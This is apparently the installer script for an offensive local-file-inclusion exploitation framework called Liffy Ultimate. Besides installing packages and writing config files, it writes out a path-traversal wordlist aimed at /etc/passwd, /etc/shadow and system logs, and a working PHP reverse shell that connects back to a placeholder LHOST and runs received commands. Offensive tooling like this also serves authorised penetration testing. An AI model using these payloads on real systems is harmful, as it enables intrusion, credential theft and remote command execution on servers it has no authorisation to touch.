#!/bin/bash
# Liffy Ultimate Setup Script
# Advanced LFI Exploitation Framework

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${CYAN}"
echo "    ██╗     ██╗███████╗███████╗██╗   ██╗"
echo "    ██║     ██║██╔════╝██╔════╝╚██╗ ██╔╝"
echo "    ██║     ██║█████╗  █████╗   ╚████╔╝ "
echo "    ██║     ██║██╔══╝  ██╔══╝    ╚██╔╝  "
echo "    ███████╗██║██║     ███████╗   ██║   "
echo "    ╚══════╝╚═╝╚═╝     ╚══════╝   ╚═╝   "
echo -e "${NC}"
echo -e "${BLUE}╔═══════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           ULTIMATE FRAMEWORK          ║${NC}"
echo -e "${BLUE}║        Advanced LFI Exploitation      ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════╝${NC}"
echo -e "${GREEN}Codename: ShadowStrike v3.0.0${NC}"
echo -e "${GREEN}Author: rotlogix & unicornFurnace${NC}"
echo ""

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   echo -e "${RED}[!] This script should not be run as root${NC}"
   exit 1
fi

# Function to print status
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

# Check system requirements
print_status "Checking system requirements..."

# Check Python version
if command -v python3 &> /dev/null; then
    PYTHON_VERSION=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
    if [[ $(echo "$PYTHON_VERSION >= 3.7" | bc -l) -eq 1 ]]; then
        print_status "Python 3.7+ found: $PYTHON_VERSION"
    else
        print_error "Python 3.7+ required, found: $PYTHON_VERSION"
        exit 1
    fi
else
    print_error "Python 3 not found. Please install Python 3.7+"
    exit 1
fi

# Check pip
if command -v pip3 &> /dev/null; then
    print_status "pip3 found"
else
    print_error "pip3 not found. Please install pip3"
    exit 1
fi

# Check git
if command -v git &> /dev/null; then
    print_status "git found"
else
    print_error "git not found. Please install git"
    exit 1
fi

# Install Python dependencies
print_status "Installing Python dependencies..."

# Create requirements file if it doesn't exist
if [ ! -f "requirements.txt" ]; then
    cat > requirements.txt << EOF
requests>=2.25.1
urllib3>=1.26.0
blessings>=1.7
colorama>=0.4.4
pyfiglet>=0.8.post1
termcolor>=1.1.0
click>=8.0.0
flask>=2.0.0
gunicorn>=20.1.0
python-nmap>=0.6.1
dnspython>=2.1.0
beautifulsoup4>=4.9.3
lxml>=4.6.0
selenium>=4.0.0
webdriver-manager>=3.8.0
aiohttp>=3.8.0
asyncio>=3.4.3
concurrent-futures>=3.1.1
psutil>=5.8.0
cryptography>=3.4.8
pycryptodome>=3.15.0
paramiko>=2.7.0
scapy>=2.4.5
netaddr>=0.8.0
ipaddress>=1.0.23
tqdm>=4.62.0
rich>=10.0.0
typer>=0.4.0
pydantic>=1.8.0
fastapi>=0.68.0
uvicorn>=0.15.0
EOF
fi

# Install dependencies
pip3 install -r requirements.txt --user

# Install system dependencies
print_status "Installing system dependencies..."

# Detect OS
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    # Linux
    if command -v apt-get &> /dev/null; then
        # Debian/Ubuntu
        print_status "Detected Debian/Ubuntu system"
        sudo apt-get update
        sudo apt-get install -y \
            python3-pip \
            python3-dev \
            build-essential \
            libssl-dev \
            libffi-dev \
            libxml2-dev \
            libxslt1-dev \
            zlib1g-dev \
            libjpeg-dev \
            libpng-dev \
            libfreetype6-dev \
            liblcms2-dev \
            libwebp-dev \
            libharfbuzz-dev \
            libfribidi-dev \
            libxcb1-dev \
            curl \
            wget \
            git \
            nmap \
            netcat \
            netcat-openbsd \
            socat \
            parallel \
            jq \
            bc \
            tree \
            htop \
            vim \
            nano \
            tmux \
            screen
    elif command -v yum &> /dev/null; then
        # CentOS/RHEL
        print_status "Detected CentOS/RHEL system"
        sudo yum update -y
        sudo yum install -y \
            python3-pip \
            python3-devel \
            gcc \
            gcc-c++ \
            openssl-devel \
            libffi-devel \
            libxml2-devel \
            libxslt-devel \
            zlib-devel \
            libjpeg-turbo-devel \
            libpng-devel \
            freetype-devel \
            lcms2-devel \
            libwebp-devel \
            harfbuzz-devel \
            fribidi-devel \
            libxcb-devel \
            curl \
            wget \
            git \
            nmap \
            nc \
            socat \
            parallel \
            jq \
            bc \
            tree \
            htop \
            vim \
            nano \
            tmux \
            screen
    elif command -v pacman &> /dev/null; then
        # Arch Linux
        print_status "Detected Arch Linux system"
        sudo pacman -Syu --noconfirm
        sudo pacman -S --noconfirm \
            python-pip \
            python \
            base-devel \
            openssl \
            libffi \
            libxml2 \
            libxslt \
            zlib \
            libjpeg-turbo \
            libpng \
            freetype2 \
            lcms2 \
            libwebp \
            harfbuzz \
            fribidi \
            libxcb \
            curl \
            wget \
            git \
            nmap \
            gnu-netcat \
            socat \
            parallel \
            jq \
            bc \
            tree \
            htop \
            vim \
            nano \
            tmux \
            screen
    else
        print_warning "Unknown Linux distribution. Please install dependencies manually."
    fi
elif [[ "$OSTYPE" == "darwin"* ]]; then
    # macOS
    print_status "Detected macOS system"
    if command -v brew &> /dev/null; then
        brew update
        brew install \
            python3 \
            pip \
            curl \
            wget \
            git \
            nmap \
            netcat \
            socat \
            parallel \
            jq \
            bc \
            tree \
            htop \
            vim \
            nano \
            tmux \
            screen
    else
        print_warning "Homebrew not found. Please install dependencies manually."
    fi
else
    print_warning "Unknown operating system. Please install dependencies manually."
fi

# Create necessary directories
print_status "Creating necessary directories..."
mkdir -p ~/.liffy
mkdir -p ~/.liffy/logs
mkdir -p ~/.liffy/sessions
mkdir -p ~/.liffy/payloads
mkdir -p ~/.liffy/templates
mkdir -p ~/.liffy/wordlists
mkdir -p ~/.liffy/results

# Create configuration file
print_status "Creating configuration file..."
cat > ~/.liffy/config.json << EOF
{
    "version": "3.0.0",
    "codename": "ShadowStrike",
    "author": "rotlogix & unicornFurnace",
    "defaults": {
        "threads": 4,
        "timeout": 30,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "output_dir": "~/.liffy/results",
        "log_level": "INFO"
    },
    "modules": {
        "exploit": {
            "default_rank": "normal",
            "auto_exploit": false
        },
        "auxiliary": {
            "default_threads": 10,
            "default_timeout": 30
        }
    },
    "api": {
        "host": "127.0.0.1",
        "port": 8080,
        "debug": false
    }
}
EOF

# Create wordlists
print_status "Creating wordlists..."
cat > ~/.liffy/wordlists/lfi_paths.txt << EOF
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
../../../etc/shadow
../../../../etc/shadow
../../../../../etc/shadow
../../../../../../etc/shadow
../../../../../../../etc/shadow
../../../../../../../../etc/shadow
../../../../../../../../../etc/shadow
../../../../../../../../../../etc/shadow
../../../../../../../../../../../etc/shadow
../../../../../../../../../../../../etc/shadow
../../../etc/hosts
../../../../etc/hosts
../../../../../etc/hosts
../../../../../../etc/hosts
../../../../../../../etc/hosts
../../../../../../../../etc/hosts
../../../../../../../../../etc/hosts
../../../../../../../../../../etc/hosts
../../../../../../../../../../../etc/hosts
../../../../../../../../../../../../etc/hosts
../../../var/log/apache2/access.log
../../../../var/log/apache2/access.log
../../../../../var/log/apache2/access.log
../../../../../../var/log/apache2/access.log
../../../../../../../var/log/apache2/access.log
../../../../../../../../var/log/apache2/access.log
../../../../../../../../../var/log/apache2/access.log
../../../../../../../../../../var/log/apache2/access.log
../../../../../../../../../../../var/log/apache2/access.log
../../../../../../../../../../../../var/log/apache2/access.log
../../../var/log/auth.log
../../../../var/log/auth.log
../../../../../var/log/auth.log
../../../../../../var/log/auth.log
../../../../../../../var/log/auth.log
../../../../../../../../var/log/auth.log
../../../../../../../../../var/log/auth.log
../../../../../../../../../../var/log/auth.log
../../../../../../../../../../../var/log/auth.log
../../../../../../../../../../../../var/log/auth.log
EOF

# Create payload templates
print_status "Creating payload templates..."
cat > ~/.liffy/payloads/php_reverse_shell.php << EOF
<?php
// PHP Reverse Shell
// Usage: php -r 'file_get_contents("http://target/file.php?page=php://input");' < payload.php

\$ip = 'LHOST';
\$port = LPORT;

if (function_exists('fsockopen')) {
    \$sock = fsockopen(\$ip, \$port);
    if (\$sock) {
        fwrite(\$sock, "Connected to target\\n");
        while (!feof(\$sock)) {
            \$cmd = fgets(\$sock);
            if (\$cmd) {
                \$output = shell_exec(\$cmd);
                fwrite(\$sock, \$output);
            }
        }
        fclose(\$sock);
    }
}
?>
EOF

# Create aliases
print_status "Creating aliases..."
if [ -f ~/.bashrc ]; then
    if ! grep -q "liffy" ~/.bashrc; then
        echo "" >> ~/.bashrc
        echo "# Liffy Ultimate Framework" >> ~/.bashrc
        echo "alias liffy='python3 $(pwd)/liffy_ultimate.py'" >> ~/.bashrc
        echo "alias liffy-fast='$(pwd)/liffy-fast'" >> ~/.bashrc
        echo "alias liffy-techniques='python3 $(pwd)/liffy_techniques.py'" >> ~/.bashrc
    fi
fi

if [ -f ~/.zshrc ]; then
    if ! grep -q "liffy" ~/.zshrc; then
        echo "" >> ~/.zshrc
        echo "# Liffy Ultimate Framework" >> ~/.zshrc
        echo "alias liffy='python3 $(pwd)/liffy_ultimate.py'" >> ~/.zshrc
        echo "alias liffy-fast='$(pwd)/liffy-fast'" >> ~/.zshrc
        echo "alias liffy-techniques='python3 $(pwd)/liffy_techniques.py'" >> ~/.zshrc
    fi
fi

# Make scripts executable
print_status "Making scripts executable..."
chmod +x liffy_ultimate.py
chmod +x liffy-fast
chmod +x liffy_techniques.py
chmod +x setup_ultimate.sh

# Create desktop entry
print_status "Creating desktop entry..."
cat > ~/.local/share/applications/liffy-ultimate.desktop << EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=Liffy Ultimate
Comment=Advanced LFI Exploitation Framework
Exec=python3 $(pwd)/liffy_ultimate.py
Icon=applications-internet
Terminal=true
Categories=Network;Security;
EOF

# Test installation
print_status "Testing installation..."
if python3 -c "import requests, blessings, colorama" 2>/dev/null; then
    print_status "Python dependencies installed successfully"
else
    print_error "Python dependencies installation failed"
    exit 1
fi

# Final message
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        INSTALLATION COMPLETE         ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Liffy Ultimate Framework has been installed successfully!${NC}"
echo ""
echo -e "${YELLOW}Usage:${NC}"
echo -e "  ${GREEN}liffy${NC}                    # Start interactive mode"
echo -e "  ${GREEN}liffy-fast${NC}              # Quick command-line tool"
echo -e "  ${GREEN}liffy-techniques${NC}        # Technique-specific commands"
echo ""
echo -e "${YELLOW}Configuration:${NC}"
echo -e "  ${GREEN}~/.liffy/config.json${NC}    # Main configuration"
echo -e "  ${GREEN}~/.liffy/wordlists/${NC}    # Wordlists directory"
echo -e "  ${GREEN}~/.liffy/payloads/${NC}     # Payload templates"
echo -e "  ${GREEN}~/.liffy/results/${NC}      # Results directory"
echo ""
echo -e "${YELLOW}Documentation:${NC}"
echo -e "  ${GREEN}README_TECHNIQUES.md${NC}    # Technique commands guide"
echo -e "  ${GREEN}examples/${NC}               # Usage examples"
echo ""
echo -e "${CYAN}Happy hacking! 🚀${NC}"
echo ""